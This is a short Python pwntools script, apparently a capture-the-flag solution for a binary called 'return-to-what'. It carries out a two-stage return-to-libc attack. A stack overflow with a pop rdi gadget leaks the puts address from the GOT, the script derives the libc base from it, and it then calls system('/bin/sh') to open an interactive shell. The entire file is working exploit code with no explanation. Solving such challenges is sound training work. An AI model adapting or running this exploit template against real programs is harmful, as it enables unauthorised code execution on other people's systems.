from pwn import *

def main():
	# Process
	elf = ELF("./return-to-what")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

	io = elf.process()

	# Enumerate
	offset    = 56
	pop_rdi   = 0x40122b
	got_puts  = 0x404018
	plt_puts  = 0x401030
	main 	  = 0x4011ad
	libc_puts_offset = libc.symbols['puts']
	libc_system_offset = libc.symbols['system']
	libc_binsh_offset = libc.search('/bin/sh').next()

	# Exploit Stage 1: Leaking address
	payload = [
		b"A" * offset,
		p64(pop_rdi),
		p64(got_puts),
		p64(plt_puts),
		p64(main)
	]

	payload = b"".join(payload)
	io.sendline(payload)
	

	leaked_address = io.recvlines()[2]
	leaked_address = bytearray(leaked_address).ljust(8, b'\x00')
	leaked_address = u64(leaked_address, endian='little')

	libc_base_address = leaked_address - libc_puts_offset

	print("Leaked PUTS@GLIBC addres: ", hex(leaked_address))
	print("LIBC base address: ", hex(libc_base_address))	
	
	libc_system_address = libc_base_address + libc_system_offset
	libc_binsh_address = libc_base_address + libc_binsh_offset

	# Exploit Stage 2: Get the shell
	payload = [
		b"A" * offset, 
		p64(pop_rdi),
		p64(libc_binsh_address),
		p64(libc_system_address)
	]
	payload = b"".join(payload)
	io.sendline(payload)

	io.interactive()


if __name__ == "__main__":
	main()